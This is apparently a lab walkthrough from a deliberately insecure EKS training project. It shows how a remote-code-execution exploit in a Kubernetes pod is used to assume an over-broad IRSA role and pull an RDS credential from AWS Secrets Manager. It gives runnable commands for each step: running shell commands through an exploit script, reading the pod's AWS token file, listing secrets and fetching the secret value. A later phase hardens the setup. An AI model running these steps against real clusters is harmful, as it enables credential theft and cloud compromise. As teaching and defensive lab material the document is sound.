# reat2shell: EKS breach

[Back](../README.md)

- [reat2shell: EKS breach](#reat2shell-eks-breach)
  - [Goal](#goal)
  - [Attack Chain](#attack-chain)
  - [Attack Steps](#attack-steps)
  - [Commands](#commands)

---

## Goal

From a React2Shell RCE in the pod, pivot to an **AWS identity** and read the
cloud crown jewel — the **RDS secret in Secrets Manager**.

- Target: `insecure-frontend` pod (SA `react2shell`), port-forwarded at
  `localhost:3000`.
- Enabled by the Phase 9 misconfig: a broad IRSA role (`Action:* Resource:*`)
  on that SA. See [09_eks.md](09_eks.md).

---

## Attack Chain

```txt
React2Shell RCE in pod
  └─▶ pod's IRSA role  (broad policy)
        └─▶ aws secretsmanager get-secret-value <rds-secret>
              └─▶ 🪙 RDS secret
```

The AWS SDK assumes the role transparently from the pod's projected token — no
IMDS, no node access. One API call from inside the RCE shell.

---

## Attack Steps

High level. Detailed commands/output in the next step.

| #   | Step              | What                                               | Expected result                   |
| --- | ----------------- | -------------------------------------------------- | --------------------------------- |
| 1   | Confirm RCE       | Run `id` via the React2Shell exploit               | Code exec on the pod              |
| 2   | Detect IRSA       | Read `AWS_ROLE_ARN` / web-identity token env vars  | Pod has an AWS identity           |
| 3   | Assume role       | `aws sts get-caller-identity` (SDK auto-uses IRSA) | Now an AWS principal              |
| 4   | Enumerate reach   | `aws secretsmanager list-secrets`                  | Broad role → lists secrets        |
| 5   | **Grab jewel**    | `aws secretsmanager get-secret-value <rds-secret>` | 🪙 RDS secret exfiltrated         |
| 6   | Show blast radius | Inspect attached role policy (`*/*`)               | Confirms over-permission          |
| 7   | Detection gap     | No CloudTrail / EKS audit logs                     | Breach is silent (phase 11 fixes) |

---

**Milestone:** cloud-level crown jewel retrieved → proceed to Phase 11 (harden
cloud: scope the IAM policy + trust, enable audit logging).

---

## Commands

- App port-forwarded at `localhost:3000`. Exploit via `scripts/rce.py`.
- Precondition: the pod must be restarted after the IRSA annotation so the
  projected AWS token is injected.

```sh
# restart the pod to pick up the IRSA token
kubectl rollout restart deploy/react2shell -n insecure-frontend
```

```sh
# 1. confirm RCE
python scripts/rce.py http://localhost:3000 "id"
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# 2. detect IRSA — pod has an AWS identity
python scripts/rce.py http://localhost:3000 "env | grep AWS"
python scripts/rce.py http://localhost:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"

# 3. assume role — SDK auto-uses IRSA
python scripts/rce.py http://localhost:3000 "aws sts get-caller-identity"

# 4. enumerate reach — broad role lists secrets
python scripts/rce.py http://localhost:3000 "aws secretsmanager list-secrets --region ca-central-1"

# 5. grab the crown jewel
python scripts/rce.py http://localhost:3000 "aws secretsmanager get-secret-value --secret-id react2shell-eks-dev-rds-credential --region ca-central-1 --query SecretString --output text"

# 6. show blast radius — the */* policy
python scripts/rce.py http://localhost:3000 "aws iam list-role-policies --role-name react2shell-eks-dev-pod-irsa"
```

> If the pod image lacks the `aws` CLI, use the SDK bundled with the app, or
> call the STS + Secrets Manager REST endpoints directly with the projected
> token. Confirmed in the next step.
